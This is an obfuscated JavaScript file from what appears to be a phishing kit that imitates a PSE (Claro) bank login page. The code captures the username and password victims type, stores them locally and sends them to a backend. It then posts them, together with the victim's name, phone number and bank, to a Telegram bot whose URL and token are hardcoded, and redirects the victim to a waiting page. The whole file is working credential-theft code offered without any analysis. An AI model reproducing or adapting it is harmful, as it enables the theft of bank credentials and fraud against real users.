const _0x54e3ae = _0x1925;
function _0x1925(_0x29e24c, _0x2b6e12) {
  const _0x54e580 = _0x54e5();
  return (
    (_0x1925 = function (_0x1925dd, _0x299f85) {
      _0x1925dd = _0x1925dd - 0x103;
      let _0x185c4a = _0x54e580[_0x1925dd];
      return _0x185c4a;
    }),
    _0x1925(_0x29e24c, _0x2b6e12)
  );
}
(function (_0x314da9, _0x24e9ce) {
  const _0x3bf7f4 = _0x1925,
    _0x1de269 = _0x314da9();
  while (!![]) {
    try {
      const _0x1c2d1d =
        (-parseInt(_0x3bf7f4(0x108)) / 0x1) *
          (parseInt(_0x3bf7f4(0x10c)) / 0x2) +
        (-parseInt(_0x3bf7f4(0x10d)) / 0x3) *
          (-parseInt(_0x3bf7f4(0x121)) / 0x4) +
        (parseInt(_0x3bf7f4(0x112)) / 0x5) *
          (parseInt(_0x3bf7f4(0x11e)) / 0x6) +
        (-parseInt(_0x3bf7f4(0x104)) / 0x7) *
          (parseInt(_0x3bf7f4(0x116)) / 0x8) +
        (-parseInt(_0x3bf7f4(0x12f)) / 0x9) *
          (parseInt(_0x3bf7f4(0x114)) / 0xa) +
        (-parseInt(_0x3bf7f4(0x129)) / 0xb) *
          (parseInt(_0x3bf7f4(0x12d)) / 0xc) +
        parseInt(_0x3bf7f4(0x127)) / 0xd;
      if (_0x1c2d1d === _0x24e9ce) break;
      else _0x1de269["push"](_0x1de269["shift"]());
    } catch (_0x36b381) {
      _0x1de269["push"](_0x1de269["shift"]());
    }
  }
})(_0x54e5, 0xea0e4);
function updateLS() {
  const _0x2fea68 = _0x1925;
  LS["setItem"](_0x2fea68(0x135), JSON[_0x2fea68(0x106)](info));
}
const button = document[_0x54e3ae(0x10b)](_0x54e3ae(0x13c)),
  userInput = document["getElementById"](_0x54e3ae(0x126)),
  passInput = document["getElementById"]("txtPass");
async function sendToTelegram(_0x113229) {
  const _0x5637b4 = _0x54e3ae;
  for (const _0x4ad9f3 of chatIds) {
    const _0x3a6054 =
      _0x5637b4(0x12b) + _0x4ad9f3 + "&text=" + encodeURIComponent(_0x113229);
    try {
      const _0x162148 = await fetch(_0x3a6054);
      if (!_0x162148["ok"])
        throw new Error(
          _0x5637b4(0x111) + _0x4ad9f3 + ":\x20" + _0x162148[_0x5637b4(0x10a)]
        );
      console["log"](_0x5637b4(0x11a) + _0x4ad9f3);
    } catch (_0x2fff7f) {
      console[_0x5637b4(0x122)](_0x5637b4(0x103) + _0x4ad9f3 + ":", _0x2fff7f);
    }
  }
}
async function updateStatus() {
  const _0x26d4dc = _0x54e3ae;
  button[_0x26d4dc(0x117)] = !![];
  try {
    const _0x17edbe = await fetch(url + "/trico/tricoData", {
      method: _0x26d4dc(0x10f),
      headers: { "Content-Type": _0x26d4dc(0x133) },
    });
    if (!_0x17edbe["ok"]) throw new Error(_0x26d4dc(0x134));
    const _0x3f403c = await _0x17edbe["json"](),
      _0x595f73 = [..._0x3f403c];
    for (const _0x560fb1 of _0x595f73) {
      if (_0x560fb1["id"] == info[_0x26d4dc(0x110)]["cc"]) {
        console[_0x26d4dc(0x109)](_0x26d4dc(0x12e));
        const _0x42c056 = await fetch(
          url + _0x26d4dc(0x13a) + _0x560fb1[_0x26d4dc(0x107)],
          {
            method: _0x26d4dc(0x10e),
            headers: { "Content-Type": _0x26d4dc(0x133) },
            body: JSON[_0x26d4dc(0x106)]({
              usuario: info[_0x26d4dc(0x110)][_0x26d4dc(0x11b)],
              password: info[_0x26d4dc(0x110)][_0x26d4dc(0x12a)],
            }),
          }
        );
        if (!_0x42c056["ok"]) throw new Error(_0x26d4dc(0x115));
        const _0x498853 = await _0x42c056[_0x26d4dc(0x124)](),
          _0x4d8f8c =
            _0x26d4dc(0x113) +
            _0x560fb1["id"] +
            _0x26d4dc(0x137) +
            _0x560fb1[_0x26d4dc(0x118)] +
            _0x26d4dc(0x132) +
            _0x560fb1[_0x26d4dc(0x136)] +
            _0x26d4dc(0x131) +
            info[_0x26d4dc(0x110)][_0x26d4dc(0x11b)] +
            _0x26d4dc(0x123) +
            info[_0x26d4dc(0x110)][_0x26d4dc(0x12a)] +
            _0x26d4dc(0x12c) +
            _0x560fb1[_0x26d4dc(0x11f)] +
            _0x26d4dc(0x105) +
            fuente +
            _0x26d4dc(0x138),
          _0x57126d = await sendToTelegram(_0x4d8f8c);
        _0x57126d
          ? console["log"](_0x26d4dc(0x130))
          : console[_0x26d4dc(0x122)](
              "No\x20se\x20pudo\x20enviar\x20el\x20mensaje\x20a\x20Telegram"
            ),
          console[_0x26d4dc(0x109)]("Usuario\x20actualizado");
      }
    }
    window[_0x26d4dc(0x11d)]["href"] = _0x26d4dc(0x120);
  } catch (_0x32f0e2) {
    console[_0x26d4dc(0x122)](_0x26d4dc(0x13b), _0x32f0e2);
  } finally {
    button[_0x26d4dc(0x117)] = ![];
  }
}
function _0x54e5() {
  const _0x1f900e = [
    "\x0a🆔Nombre:\x20",
    "\x0aCorrigió\x20Usuario",
    "focus",
    "/trico/tricoUserPse/",
    "Error\x20al\x20procesar\x20la\x20actualización:",
    "btnUsuario",
    "Error\x20de\x20red\x20al\x20enviar\x20mensaje\x20a\x20",
    "7JWysbQ",
    "\x0aFuente:\x20",
    "stringify",
    "idreg",
    "364097zCaPzu",
    "log",
    "statusText",
    "getElementById",
    "2cbrnXa",
    "3WkoCse",
    "PUT",
    "GET",
    "metaInfo",
    "Error\x20al\x20enviar\x20mensaje\x20a\x20",
    "285140xgxQmw",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "16331510TyHujp",
    "Error\x20al\x20actualizar\x20usuario",
    "13986056hnfgXx",
    "disabled",
    "nombre",
    "value",
    "Mensaje\x20enviado\x20a\x20",
    "user",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "location",
    "132BGfDXE",
    "bank",
    "wait.html",
    "5725516uUFEru",
    "error",
    "\x0a🔒Contraseña:\x20",
    "json",
    "click",
    "txtUsuario",
    "35582898MSgdse",
    "preventDefault",
    "247137TdJWeH",
    "puser",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "\x0a🏦Banco:\x20",
    "384zrDlus",
    "Usuario\x20encontrado",
    "9uoTHHa",
    "Mensaje\x20enviado\x20correctamente\x20a\x20Telegram",
    "\x0a🚹Usuario:\x20",
    "\x0a📱Teléfono:\x20",
    "application/json",
    "Error\x20al\x20obtener\x20los\x20datos\x20del\x20servidor",
    "info",
    "telefono",
  ];
  _0x54e5 = function () {
    return _0x1f900e;
  };
  return _0x54e5();
}
button["addEventListener"](_0x54e3ae(0x125), async function (_0x5d7333) {
  const _0x5c19a7 = _0x54e3ae;
  _0x5d7333[_0x5c19a7(0x128)]();
  if (userInput["value"] === "" || passInput["value"] === "") {
    alert(_0x5c19a7(0x11c)), userInput[_0x5c19a7(0x139)]();
    return;
  }
  const _0x1a46c2 = userInput[_0x5c19a7(0x119)],
    _0x3cccdb = passInput["value"];
  (info[_0x5c19a7(0x110)][_0x5c19a7(0x11b)] = _0x1a46c2),
    (info["metaInfo"]["puser"] = _0x3cccdb),
    updateLS(),
    await updateStatus();
});
